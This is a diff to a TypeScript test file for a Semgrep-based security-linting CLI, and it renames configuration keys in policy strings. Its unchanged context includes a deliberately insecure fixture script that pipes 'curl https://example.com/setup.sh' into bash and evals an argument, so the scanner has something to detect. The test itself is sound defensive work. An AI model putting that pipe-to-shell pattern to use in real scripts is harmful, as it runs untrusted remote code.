@@ -11,7 +11,7 @@ import type { RunReport } from '#cli/types/execution/execution.ts';
 import { containing, containingAll } from '#tests/harness/expectations.ts';
 
 const APP_SEMGREP =
-    '[guides]\ninstall = false\n[[scope]]\npath = "app"\nkits = ["express"]\n[scope.tools.semgrep]\nignore = [{ paths = ["app/**/ignored.js"], reason = "Generated fixtures are checked by their producer." }]\n[[scope]]\npath = "app/child"\n[[scope]]\npath = "sibling"\n';
+    '[rules]\ninstall = false\n[[scope]]\npath = "app"\nkits = ["express"]\n[scope.tools.semgrep]\nexclude = [{ paths = ["app/**/ignored.js"], reason = "Generated fixtures are checked by their producer." }]\n[[scope]]\npath = "app/child"\n[[scope]]\npath = "sibling"\n';
 
 if (toolShipsHere('semgrep'))
     test('framework security packs stay within inherited scopes and preserve sibling input', async () => {
@@ -83,7 +83,7 @@ if (toolShipsHere('semgrep'))
         const root = sandbox.path;
         const script = '#!/usr/bin/env bash\ncurl https://example.com/setup.sh | bash\neval "$1"\n';
         await createFileTree(root, {
-            'gspot.toml': policyOf(['bash', 'swift', 'security'], '[guides]\ninstall = false\n', 'recommended'),
+            'gspot.toml': policyOf(['bash', 'swift', 'security'], '[rules]\ninstall = false\n', 'recommended'),
             'script.sh': script,
             'Value.swift': SWIFT_DEFECTS,
         });
@@ -98,7 +98,7 @@ if (toolShipsHere('semgrep'))
         ).toStrictEqual(['ios-keychain-accessible-always']);
         await Bun.write(
             join(root, 'gspot.toml'),
-            policyOf(['bash', 'swift', 'security'], '[guides]\ninstall = false\n', 'all'),
+            policyOf(['bash', 'swift', 'security'], '[rules]\ninstall = false\n', 'all'),
         );
         const session = await openSession(root);
         for (const output of emitted(session).files.filter(({ path }) => path.includes('/semgrep/')))
